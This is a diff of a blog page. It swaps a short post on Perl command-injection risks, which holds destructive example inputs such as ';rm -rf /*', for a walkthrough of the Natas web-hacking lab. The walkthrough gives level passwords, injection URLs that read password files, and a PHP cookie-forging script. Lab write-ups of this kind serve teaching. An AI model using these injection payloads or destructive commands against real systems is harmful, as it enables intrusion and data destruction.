@@ -37,9 +37,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="description" content="The official blog of I4INFO, Knowledge for the better future!">
 
-    <title>Security Issue in perl scripts - I4INFO</title>
+    <title>Natas - I4INFO</title>
 
-    <link rel="canonical" href="http://i4info.in//2016/01/06/wehacking-kr/">
+    <link rel="canonical" href="http://i4info.in//2016/01/22/natas-solutions/">
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="/css/bootstrap.min.css">
@@ -107,11 +107,11 @@
         <div class="row">
             <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                 <div class="post-heading">
-                    <h1>Security Issue in perl scripts</h1>
+                    <h1>Natas</h1>
                     
-                    <h2 class="subheading">Security flaws</h2>
+                    <h2 class="subheading">Solutions</h2>
                     
-                    <span class="meta">Posted by Heeraj on January 6, 2016</span>
+                    <span class="meta">Posted by Heeraj on January 22, 2016</span>
                 </div>
             </div>
         </div>
@@ -126,25 +126,144 @@
 
 				<p> If you like to read our old blogs you are welcome, <a href="http://heeraj123.wordpress.com">I4INFO</a> </p>
 
-<p>Happy new year readers! One of the domain, where I didn't have look would the perl security issue. So I thought to have a blog on that. I would like to mention,that as language no language has inbuilt security issue's, its the devolper who makes all the issue, same is with the perl. Some bad habits, that makes creates the problem, this can help even the hacker's to take down your system.</p>
+<p>I spent last day an hour or something on natas , the website would be very familiar to you. It was the website from which I first started to learn linux commands and the same people who run banditoverwire. Actually came to know from wechall.net, well that was also new to me :) But I could assure you that if you want to start with web exploitation as a CTF point of you, this is http://natas.natas.labs.overthewire.org very good option.</p>
 
-<p>Many problem, is validation every input should be properly validated, thus you can avoid most of the troubles. Perl is known as "glue language" , as it make other work for it. For that perl uses two function system() and exec().</p>
+<p>Challenge 00</p>
 
-<blockquote>system ("cat /usr/stats/$username");</blockquote>
+<p>See the source code.</p>
 
-<p>Think that above $username comes from get parameter, if there is no proper validation. Destructive minded user can pass the value ";rm -rf /*". "THE END". One way to avoid this is by.</p>
+<blockquote>pass:gtVrDuiDfck831PqWsLEZy5gyDz1clto</blockquote>
 
-<blockquote>system ("cat", "/usr/stats/$username");</blockquote>
+<p>Challenge 01</p>
 
-<p>Here the ";rm -rf /*" will not be wrking but chance of getting the detal by passing "../../etc/passwd". This is much more better since there is no shell here. This applies for both exec and system.</p>
+<p>Go to developer option by clicking F12</p>
 
-<p>One common problem is that some versions of the Unix "mail" utility will execute a shell command when they see the ~! escape sequence in particular contexts. Thus, user input containing "~!rm -rf *" on a blank line in a message body may cause trouble under certain circumstances.</p>
+<blockquote>pass:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi</blockquote>
 
-<p>The above one was lucky way! But the correct was to first get the dump, that you can get by clicking the error message. The same as above intercept the request , see the code there you have a filter function. So here you has to use some trick , to run function</p>
+<p>Challenge 02</p>
 
-<p>Rest about the perl security will be soon be updated</p>
+<p>Goto files directory</p>
+
+<blockquote>pass:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14</blockquote>
+
+<p>Challenge 03</p>
+
+<p>Open the robots.txt you will get the file which contain pass to next level.</p>
+
+<blockquote>natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ</blockquote>
+
+<p>Challenge 04</p>
+
+<p>Use a burp suite and change the referrer</p>
+
+<blockquote>Referer: http://natas5.natas.labs.overthewire.org/ <br />
+            pass:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
+</blockquote>
+
+<p>Challenge 05</p>
+
+<p>You have to change the cookie of login from 0 to 1, using edit my cookie or firebug</p>
+
+<blockquote>pass:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</blockquote>
+
+<p>Challenge 06</p>
+
+<p> You can easily get the secret using the page source, when you get the secret.
+Give a post request using secret and a submit. Write a script or use postman in chrome.
+</p>
+
+<blockquote>pass:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9</blockquote>
+
+<p>Challenge 07</p>
+
+<p>Remote file inclusion</p>
+
+<blockquote>pass:DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe</blockquote>
+
+<p>Challenge 08</p>
+
+<p>Exploit</p>
+
+<blockquote><?phpecho base64_decode(strrev(hex2bin("3d3d516343746d4d6d6c315669563362")));?></blockquote>
+
+<blockquote>pass:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl</blockquote>
+
+<p>Challenge 09</p>
+
+<p>Exploit</p>
+
+<p>http://natas9.natas.labs.overthewire.org/?needle[]=ls&amp;needle=;cat%20/etc/natas_webpass/natas10<p>
+
+<blockquote>Pass:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu</blockquote>
+
+<p>Challenge 10</p>
+
+<p>There are exactly 2 ways to solve the challenge, one is going back to challenge 9
+and entering ".* /etc/natas_webpass/natas11"</p>
+
+<p>Solution 2 would be by using line feed you can observer we can execute the command and %20 for space. So the exploit look like this.</p>
+
+<blockquote>http://natas10.natas.labs.overthewire.org/?needle[]=.*%20/etc/natas_webpass/natas11&amp;needle=%0acat%20.*%20/etc/natas_webpass/natas11</blockquote>
+
+<blockquote>pass:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK</blockquote>
+
+<p>challenge 11</p>
+
+<p>Getting the key</p>
+
+<blockquote>
+<?php<br>
+<br>
+	$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");<br>
+	$cookie = "ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D";<br>
+	function xor_encrypt($in,$key) {<br>
+		$text = $in;<br>
+		$outText = '';<br>
+		// Iterate through each character<br>
+		for($i=0;$i<strlen($text);$i++) {<br>
+			$outText .= $text[$i] ^ $key[$i % strlen($key)];<br>
+		}<br>
+		<br>
+		return $outText;<br>
+        }<br>
+	$key = xor_encrypt(json_encode($defaultdata), base64_decode($cookie));<br>
+	echo $key;<br>
+	echo "\n";<br>
+<br>
+?><br />
+</blockquote>
+
+<p>Get the cookie</p>
+<blockquote>
+<?php<br>
+	$defaultdata = array( "showpassword"=>"Yes", "bgcolor"=>"#ffffff");<br>
+	function xor_encrypt($in) {<br>
+	    $key = 'qw8J';<br>
+	    $text = $in;<br>
+	    $outText = '';<br>
+	    // Iterate through each character<br>
+	     for($i=0;$i<strlen($text);$i++) {<br>
+		        $outText .= $text[$i] ^ $key[$i % strlen($key)];<br>
+     	     }<br>
+                return $outText;<br>
+	}<br>
+	$newcookie = base64_encode(xor_encrypt(json_encode($defaultdata)));<br>
+	echo " \n ------------------------------------\n";<br>
+	echo " \n             New cookie              \n";<br>
+	echo $newcookie;<br>
+<br>
+	echo " \n ------------------------------------\n";<br>
+?><br />
+</blockquote>
+
+<p>Add this cookie data</p>
+
+<blockquote>pass: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3</blockquote>
+
+<p>Wait for the next blog, will be soon back!</p>
 
 <p>Thank you for reading the blog! </p>
+</p></p>
 
                 <div id="disqus_thread"></div>
                 
@@ -153,7 +272,7 @@
                 <ul class="pager">
                     
                     <li class="previous">
-                        <a href="/2016/01/06/perl-security/" data-toggle="tooltip" data-placement="top" title="Security Issue in perl scripts">&larr; Previous Post</a>
+                        <a href="/2016/01/20/wehacking-kr/" data-toggle="tooltip" data-placement="top" title="Webhacking Kr">&larr; Previous Post</a>
                     </li>
                     
                     
